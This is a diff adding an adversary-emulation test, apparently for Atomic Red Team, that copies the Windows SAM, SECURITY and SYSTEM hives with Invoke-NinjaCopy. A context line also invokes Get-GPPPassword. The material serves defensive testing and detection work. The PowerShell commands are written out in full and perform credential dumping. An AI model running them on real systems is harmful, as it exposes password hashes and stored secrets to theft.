@@ -217,3 +217,42 @@ atomic_tests:
     command: |
       . #{gpp_script_path}
       Get-GPPPassword -Verbose
+
+- name: Dump SAM, SECURITY and SYSTEM files using NinjaCopy PowerShell script
+  description: |
+    This test uses PowerShell to copy SAM, SECURITY and SYSTEM files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
+    Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    sam_binary_path:
+      description: Path of the SAM file
+      type: string
+      default: C:\Windows\System32\config\sam
+    system_binary_path:
+      description: Path of the SYSTEM file
+      type: string
+      default: C:\Windows\System32\config\system
+    security_binary_path:
+      description: Path of the SECURITY file
+      type: string
+      default: C:\Windows\System32\config\security
+    output_folder:
+      description: Output folder path
+      type: Path
+      default: C:\Windows\Temp
+
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      . $PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
+      Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
+      Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
+      Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
+    cleanup_command: |
+      rm "#{output_folder}\sam"
+      rm "#{output_folder}\system"
+      rm "#{output_folder}\security"
